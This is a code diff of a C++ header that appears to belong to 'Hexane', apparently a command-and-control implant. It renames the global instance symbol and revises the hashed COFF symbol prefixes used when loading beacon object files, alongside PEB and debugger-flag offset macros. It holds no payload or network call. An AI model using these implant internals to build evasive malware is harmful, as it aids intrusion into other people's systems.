@@ -2,7 +2,7 @@
 #define HEXANE_MONOLITH_HPP
 #include <core/ntimports.hpp>
 
-EXTERN_C ULONG __global;
+EXTERN_C ULONG __instance;
 EXTERN_C LPVOID InstStart();
 EXTERN_C LPVOID InstEnd();
 
@@ -24,7 +24,7 @@ EXTERN_C LPVOID InstEnd();
 #define PIPE_BUFFER_MAX     					    (64 * 1000 - 1)
 #define MIN(a,b)								    (a < b ? a : b)
 
-#define GLOBAL_OFFSET								(U_PTR(InstStart()) + U_PTR(&__global))
+#define GLOBAL_OFFSET								(U_PTR(InstStart()) + U_PTR(&__instance))
 #define HEXANE 		    							auto Ctx = R_CAST(_hexane*, C_DREF(C_PTR(GLOBAL_OFFSET)));
 
 #define C_CAST(T,x)								    (const_cast<T>(x))
@@ -80,27 +80,31 @@ EXTERN_C LPVOID InstEnd();
 	#define DBG_FLAG_OFFSET 					    DBG_FLAG_OFFSET64
 	#define IMAGE_OPT_MAGIC 					    IMAGE_NT_OPTIONAL_HDR64_MAGIC
 	#define MACHINE_ARCH    					    IMAGE_FILE_MACHINE_AMD64
-// set these dynamically?
-	#define COFF_PREP_SYMBOL        			    0xec6ba2a8 	// __win32_
+// __impl_HASHNAME			; already loaded
+// __impl_HexaneHASHNAME	; internal function
+// __impl_CRYPT32$HASHNAME	; loadable
+	#define COFF_PREP_SYMBOL        			    0xec6ba2a8 	// __impl_
 	#define COFF_PREP_SYMBOL_SIZE   			    6
-	#define COFF_PREP_BEACON        			    0xd0a409b0  // __Hexane
+	#define COFF_PREP_BEACON        			    0xd0a409b0  // __impl_Hexane
 	#define COFF_PREP_BEACON_SIZE   			    (COFF_PREP_SYMBOL_SIZE + 6)
 	#define GLOBAL_CONTEXT           			    0xbfded9c9  // .refptr.__instance
 #elif _M_IX86
-	#define IP_REG								Eip
-	#define ENTRYPOINT_REG 						Eax
-	#define PTR_MASK                    		0x7FFF
-	#define PEB_POINTER     					PEB_POINTER32
-	#define REG_PEB_OFFSET(x) 					REB_PEB32(x)
-	#define DBG_FLAG_OFFSET 					DBG_FLAG_OFFSET32
-	#define IMAGE_OPT_MAGIC 					IMAGE_NT_OPTIONAL_HDR32_MAGIC
-	#define MACHINE_ARCH    					IMAGE_FILE_MACHINE_I386
-// set these dynamically?
-    #define COFF_PREP_SYMBOL        			0x79dff807	// __win32__
-    #define COFF_PREP_SYMBOL_SIZE   			7
-    #define COFF_PREP_BEACON        			0x4c20aa4f	// __Hexane
-    #define COFF_PREP_BEACON_SIZE   			(COFF_PREP_SYMBOL_SIZE + 6)
-    #define GLOBAL_CONTEXT           			0xb341b5b9	// __instance
+	#define IP_REG									Eip
+	#define ENTRYPOINT_REG 							Eax
+	#define PTR_MASK                    			0x7FFF
+	#define PEB_POINTER     						PEB_POINTER32
+	#define REG_PEB_OFFSET(x) 						REB_PEB32(x)
+	#define DBG_FLAG_OFFSET 						DBG_FLAG_OFFSET32
+	#define IMAGE_OPT_MAGIC 						IMAGE_NT_OPTIONAL_HDR32_MAGIC
+	#define MACHINE_ARCH    						IMAGE_FILE_MACHINE_I386
+// __impl__HASHNAME			; already loaded
+// __impl__HexaneHASHNAME	; internal function
+// __impl__CRYPT32$HASHNAME	; loadable
+    #define COFF_PREP_SYMBOL        				0x79dff807	// __impl__
+    #define COFF_PREP_SYMBOL_SIZE   				8
+    #define COFF_PREP_BEACON        				0x4c20aa4f	// __impl__Hexane
+    #define COFF_PREP_BEACON_SIZE   				(COFF_PREP_SYMBOL_SIZE + 6)
+    #define GLOBAL_CONTEXT           				0xb341b5b9	// __instance
 #endif
 
 #define EGRESS 										0
